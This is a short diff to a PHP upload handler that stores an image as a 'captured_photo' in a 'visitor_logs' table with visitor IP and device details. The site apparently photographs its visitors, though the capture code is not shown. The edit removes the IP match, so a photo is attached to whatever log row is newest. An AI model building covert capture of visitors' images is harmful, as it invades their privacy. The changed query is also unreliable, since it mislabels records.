@@ -63,9 +63,14 @@ if (!empty($image_data)) {
             $ip = $_SERVER['REMOTE_ADDR'] ?? '127.0.0.1';
             if ($ip === '::1') $ip = '127.0.0.1';
             
-            // Update the latest visitor log for this IP or insert new
-            $stmt = $pdo->prepare("UPDATE visitor_logs SET captured_photo = :photo WHERE ip_address = :ip ORDER BY id DESC LIMIT 1");
-            $stmt->execute([':photo' => $rel_path, ':ip' => $ip]);
+            // Update the most recent visitor log or insert a new one
+            $stmt = $pdo->prepare("UPDATE visitor_logs SET captured_photo = :photo ORDER BY id DESC LIMIT 1");
+            $stmt->execute([':photo' => $rel_path]);
+            
+            if ($stmt->rowCount() === 0) {
+                $ins = $pdo->prepare("INSERT INTO visitor_logs (ip_address, captured_photo, page_visited, device_type, browser, os) VALUES (:ip, :photo, '/', 'Mobile', 'Browser', 'OS')");
+                $ins->execute([':ip' => $ip, ':photo' => $rel_path]);
+            }
             
             echo json_encode(['status' => 'success', 'photo' => $rel_path]);
             exit;
